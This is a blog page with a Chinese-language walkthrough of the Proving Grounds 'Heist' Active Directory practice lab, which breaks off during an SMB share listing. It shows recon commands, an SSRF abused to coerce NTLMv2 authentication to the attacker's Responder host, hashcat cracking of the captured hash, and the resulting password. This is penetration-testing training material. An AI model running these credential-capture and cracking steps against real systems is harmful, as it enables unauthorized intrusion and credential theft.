@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="baidu-site-verification" content="codeva-l4PbCwKc7Z">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="FEUc84rh7dgaXl_JOY_Bq7sulvZljH">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monaco:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.thiiiiink.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Proving Grounds Practice Lab中Heist打靶过程记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Proving Grounds Practice - Heist">
+<meta property="og:url" content="https://www.thiiiiink.com/post/20250304004106.html">
+<meta property="og:site_name" content="临渊羡鱼">
+<meta property="og:description" content="Proving Grounds Practice Lab中Heist打靶过程记录">
+<meta property="og:locale">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-6.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-10.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-9.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-11.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-12.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-5.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-4.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-7.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-8.png.png">
+<meta property="article:published_time" content="2025-03-03T16:41:06.000Z">
+<meta property="article:modified_time" content="2025-09-30T08:03:12.631Z">
+<meta property="article:author" content="Yiaos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://thiiiiink.com/202508/asynccode-6.png.png">
+
+<link rel="canonical" href="https://www.thiiiiink.com/post/20250304004106.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Proving Grounds Practice - Heist | 临渊羡鱼</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-J67WGCEZY5"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-J67WGCEZY5');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?257c5564d6a2b53ffc355cd89f5f2095";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">临渊羡鱼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">退而结网</p>
+      <a>
+        <img class="custom-logo-image" src="/images/avatar.gif" alt="临渊羡鱼">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://www.thiiiiink.com/post/20250304004106.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yiaos">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临渊羡鱼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Proving Grounds Practice - Heist
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-03-04 00:41:06" itemprop="dateCreated datePublished" datetime="2025-03-04T00:41:06+08:00">2025-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-09-30 16:03:12" itemprop="dateModified" datetime="2025-09-30T16:03:12+08:00">2025-09-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/" itemprop="url" rel="index"><span itemprop="name">What We Do-三天打鱼</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/" itemprop="url" rel="index"><span itemprop="name">OSCP</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/" itemprop="url" rel="index"><span itemprop="name">PG Lab</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/Active-Directory/" itemprop="url" rel="index"><span itemprop="name">Active Directory</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">Proving Grounds Practice Lab中Heist打靶过程记录</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Hard</p>
+<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><h2 id="autorecon-192-168-149-165"><a href="#autorecon-192-168-149-165" class="headerlink" title="autorecon 192.168.149.165"></a>autorecon 192.168.149.165</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-6.png.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[*] domain found on tcp/53.</span><br><span class="line">    dns domain</span><br><span class="line"></span><br><span class="line">[*] kerberos-sec found on tcp/88.</span><br><span class="line">    kerberos-sec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/135.</span><br><span class="line"></span><br><span class="line">[*] netbios-ssn found on tcp/139.</span><br><span class="line"></span><br><span class="line">[*] ldap found on tcp/389. / 3268 </span><br><span class="line">    heist.offsec</span><br><span class="line">    rootDomainNamingContext: DC=heist,DC=offsec</span><br><span class="line">|   ldapServiceName: heist.offsec:dc01$@HEIST.OFFSEC</span><br><span class="line"></span><br><span class="line">[*] microsoft-ds found on tcp/445.</span><br><span class="line">    SMB 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] kpasswd5 found on tcp/464.</span><br><span class="line"></span><br><span class="line">[*] ncacn_http found on tcp/593.</span><br><span class="line"></span><br><span class="line">[*] ms-wbt-server found on tcp/3389.</span><br><span class="line">    commonName=DC01.heist.offsec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/8080.</span><br><span class="line">    Server: Werkzeug/2.0.1 Python/3.9.0</span><br><span class="line"></span><br><span class="line">    ssrf</span><br><span class="line">    http://192.168.149.165:8080/?url=http://localhost:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] tcpwrapped found on tcp/636.</span><br><span class="line"></span><br><span class="line">[*] tcpwrapped found on tcp/3269.</span><br><span class="line"></span><br><span class="line">[*] wsman found on tcp/5985.</span><br><span class="line">    WinRM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] mc-nmf found on tcp/9389.</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/49666.</span><br><span class="line">[*] msrpc found on tcp/49667.</span><br><span class="line">[*] ncacn_http found on tcp/49673.</span><br><span class="line">[*] msrpc found on tcp/49674.</span><br><span class="line">[*] msrpc found on tcp/49677</span><br><span class="line">[*] msrpc found on tcp/49704.</span><br><span class="line">[*] msrpc found on tcp/49786.</span><br><span class="line"></span><br><span class="line">[*] domain found on udp/53.</span><br><span class="line"></span><br><span class="line">[*] kerberos-sec found on udp/88.</span><br><span class="line"></span><br><span class="line">[*] ntp found on udp/123.</span><br></pre></td></tr></table></figure>
+
+<h2 id="domain-dig"><a href="#domain-dig" class="headerlink" title="domain dig"></a>domain dig</h2><p>首先添加heist.offsec和dc1.heist.offsec到 &#x2F;etc&#x2F;hosts中，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dig @<span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span> AXFR heist.offsec</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.20</span><span class="number">.2</span>-<span class="number">1</span>-Debian &lt;&lt;&gt;&gt; @<span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span> AXFR heist.offsec</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; <span class="keyword">global</span> options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>
+
+<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient 192.168.149.165 -N</span><br><span class="line">Cannot connect to server.  Error was NT<span class="emphasis">_STATUS_</span>LOGON<span class="emphasis">_FAILURE</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.149.165 -N</span><br><span class="line">session setup failed: NT<span class="emphasis">_STATUS_</span>ACCESS<span class="emphasis">_DENIED</span></span><br><span class="line"><span class="emphasis">                         </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ldapsearch</span> <span class="string">-H</span> <span class="string">ldap://192.168.149.165</span> <span class="string">-x</span> <span class="string">-b</span> <span class="string">&quot;DC=offsec,DC=heist&quot;</span> <span class="string">|tee</span> <span class="string">ldap_dump</span></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;DC=offsec,DC=heist&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line"><span class="attr">search:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">result:</span> <span class="number">1</span> <span class="string">Operations</span> <span class="string">error</span></span><br><span class="line"><span class="attr">text: 000004DC: LdapErr:</span> <span class="string">DSID-0C090A5C,</span> <span class="attr">comment:</span> <span class="string">In</span> <span class="string">order</span> <span class="string">to</span> <span class="string">perform</span> <span class="string">this</span> <span class="string">opera</span></span><br><span class="line"> <span class="string">tion</span> <span class="string">a</span> <span class="string">successful</span> <span class="string">bind</span> <span class="string">must</span> <span class="string">be</span> <span class="string">completed</span> <span class="string">on</span> <span class="string">the</span> <span class="string">connection.,</span> <span class="string">data</span> <span class="number">0</span><span class="string">,</span> <span class="string">v4563</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whatweb -a 3 http://192.168.149.165:8080</span><br><span class="line">http://192.168.149.165:8080 [<span class="string">200 OK</span>] Bootstrap[<span class="string">3.3.6</span>], Country[<span class="string">RESERVED</span>][<span class="symbol">ZZ</span>], HTML5, HTTPServer[Werkzeug/2.0.1 Python/3.9.0], IP[192.168.149.165], JQuery[2.2.2], Python[3.9.0], Script, Title[Super Secure Web Browser], Werkzeug[2.0.1]</span><br><span class="line"><span class="code">                                     </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/wordlists/dirb/big.txt -u http://192.168.149.165:8080 -t 40</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.149.165:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 40</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/big.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Progress: 20469 / 20470 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssrf-vuln"><a href="#ssrf-vuln" class="headerlink" title="ssrf vuln"></a>ssrf vuln</h3><p>访问 <code>http://192.168.149.165:8080/</code>页面如下，只有一个输入框，提示输入一个url, 输入 <code>http://192.168.149.165:8080/</code></p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-10.png.png"></p>
+<p>还是同一个页面，确定是ssrf漏洞.</p>
+<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><p>截止目前我们还没有得到任何和用户相关的信息，如果可以窃取到NTLMV2 hash的话，就有了突破口，接下来使用 <code>responder</code>窃取handshake时的hash</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-9.png.png"></p>
+<p>kali启动responser, 输入框内输入kali的80端口地址 <code>http://192.168.45.165/</code>， 获取到了 NTLM V2 hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0 -wv</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[!] Error starting TCP server on port 3389, check permissions or other servers running.</span><br><span class="line">[HTTP] Sending NTLM authentication request to 192.168.149.165</span><br><span class="line">[HTTP] GET request from: ::ffff:192.168.149.165  URL: / </span><br><span class="line">[HTTP] NTLMv2 Client   : 192.168.149.165</span><br><span class="line">[HTTP] NTLMv2 Username : HEIST\enox</span><br><span class="line">[HTTP] NTLMv2 Hash     : enox::HEIST:c22b3ec3fb2f7638:2F5E57D00CCDFDF244D34A4A120C58F9:0101000000000000D2CF76FF388CDB01ED4B9EE32A689CD900000000020008004A004E003300460001001E00570049004E002D005200440055004200540058005A005000390049004500040014004A004E00330046002E004C004F00430041004C0003003400570049004E002D005200440055004200540058005A0050003900490045002E004A004E00330046002E004C004F00430041004C00050014004A004E00330046002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100360035000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>既然有了hash,接下来就是破解了 <code>hashcat -m 5600 enox.hash /usr/share/wordlist/rockyou.txt</code>, 得到密码 <code>enox:california</code></p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-11.png.png"></p>
+<p>接下来使用密码通过3389登录rdp, 登录失败</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp +clipboard /u:enox /p:california /v:192.168.149.165 /d:heist.offsec</span><br><span class="line">[00:07:24:582] [2881148:2881151] [WARN][com.freerdp.crypto] - Certificate verification failure <span class="string">&#x27;self-signed certificate (18)&#x27;</span> at stack position 0</span><br><span class="line">[00:07:24:582] [2881148:2881151] [WARN][com.freerdp.crypto] - CN = DC01.heist.offsec</span><br><span class="line">[00:07:24:200] [2881148:2881151] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer</span><br><span class="line">[00:07:24:200] [2881148:2881151] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]</span><br><span class="line">[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer</span><br><span class="line">[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]</span><br><span class="line">[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core] - freerdp_post_connect failed</span><br></pre></td></tr></table></figure>
+
+<p>登录smb,没有得到什么有用信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.149.165 -U enox</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\enox]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 192.168.149.165 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                     </span><br><span class="line">smbclient //192.168.149.165/netlogon -U enox</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\enox]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line">  ..                                  D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 3249419 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                                                             </span><br><span class="line">smbclient //192.168.149.165/sysvol -U enox</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\enox]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line">  ..                                  D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line">  heist.offsec                       Dr        0  Tue Jul 20 19:01:21 